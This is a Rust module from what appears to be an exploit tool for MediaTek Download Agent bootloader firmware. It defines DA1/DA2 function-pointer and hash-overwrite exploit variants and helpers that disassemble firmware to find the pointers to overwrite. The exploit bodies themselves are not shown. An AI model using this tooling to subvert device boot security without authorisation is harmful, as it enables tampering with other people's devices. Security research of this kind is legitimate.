use clap::ValueEnum;
use da_parser::da::hl::Region;
use da_patcher::{
    Disassembler, extract_imm,
    slice::fuzzy::{fuzzy_search_thumb2, generic_reg_matcher},
};
use da_soc::SoC;
use derive_more::IsVariant;
use enum_dispatch::enum_dispatch;
use simpleport::Port;
use strum::EnumDiscriminants;

pub mod croissant;
pub mod croissant2;
pub mod pumpkin;

use crate::{
    Result,
    exploit::{croissant::Croissant, croissant2::Croissant2, pumpkin::Pumpkin},
};

#[enum_dispatch]
pub trait Exploit {
    fn run(&self, port: &mut Port) -> Result<()>;
}

#[derive(EnumDiscriminants)]
#[strum_discriminants(derive(ValueEnum, IsVariant))]
#[enum_dispatch(Exploit)]
pub enum Exploits<'a> {
    /// DA2 function pointer overwrite
    Croissant(Croissant<'a>),
    /// DA1 function pointer overwrite
    Croissant2(Croissant2<'a>),
    /// DA1 hash overwrite
    Pumpkin(Pumpkin<'a>),
}

impl<'a> Exploits<'a> {
    pub fn description(&self) -> &'static str {
        match self {
            Self::Croissant(_) => "Croissant (DA2)",
            Self::Croissant2(_) => "Croissant (DA1)",
            Self::Pumpkin(_) => "Pumpkin",
        }
    }
}

impl ExploitsDiscriminants {
    pub fn map_to_exploit<'a>(
        self,
        da1: &'a Region,
        da2: &'a Region,
        payload: &'a [u8],
        soc: SoC,
    ) -> Result<Exploits<'a>> {
        match self {
            Self::Croissant => todo!(),
            Self::Croissant2 => Ok(Exploits::Croissant2(Croissant2::new(
                da1,
                payload,
                soc.da_sram_addr(),
            ))),
            Self::Pumpkin => Ok(Exploits::Pumpkin(Pumpkin::new(
                da1,
                da2,
                payload,
                soc.da_sram_addr(),
            ))),
        }
    }
}

pub(super) fn croissant_find_ptr(
    pattern: &str,
    bytes: &[u8],
    pc_align: usize,
) -> Result<(u32, u32)> {
    let disasm = Disassembler::try_new()?;
    let ldr_offset = find(&disasm, bytes, pattern)? as usize;
    let instructions = disasm.thumb2(&bytes[ldr_offset..ldr_offset + 4])?;
    let ldr = instructions
        .get(0)
        .ok_or(da_patcher::err::Error::PatternNotFound)?;
    // The actual ptr offset, e.g. #0x10
    let offset = extract_imm(
        ldr.op_str()
            .ok_or(da_patcher::err::Error::InstrOpNotAvailable)?,
    )? as u32;

    let start = ldr_offset - 0x50;
    let base_ldr_offset =
        start + find(&disasm, &bytes[start..ldr_offset], "ldr r?, [pc, #?]")? as usize;
    let instructions = disasm.thumb2(&bytes[base_ldr_offset..base_ldr_offset + 4])?;
    let ldr = instructions
        .get(0)
        .ok_or(da_patcher::err::Error::PatternNotFound)?;
    // The ldr is pc-relative, remember?
    let base_address_offset = extract_imm(
        ldr.op_str()
            .ok_or(da_patcher::err::Error::InstrOpNotAvailable)?,
    )?;
    let start = base_ldr_offset + pc_align + base_address_offset;
    let base_address = u32::from_le_bytes(bytes[start..start + 4].try_into()?);

    Ok((base_address, offset))
}

pub(super) fn find(disasm: &Disassembler, bytes: &[u8], pattern: &str) -> Result<u32> {
    Ok(*fuzzy_search_thumb2(&disasm, bytes, pattern, generic_reg_matcher)?.start() as u32)
}

#[inline]
pub(super) fn cmp(disasm: &Disassembler, bytes: &[u8]) -> Result<u32> {
    find(disasm, bytes, "cmp r?, r?; beq #?; adr r?, #?; bl #?")
}

pub(super) fn boot_da2(disasm: &Disassembler, bytes: &[u8]) -> Result<u32> {
    find(
        disasm,
        bytes,
        "push.w ??; ldr r?, [pc, #?]; sub sp, #?; ldr r?, [r?, #?]; blx r?",
    )
}
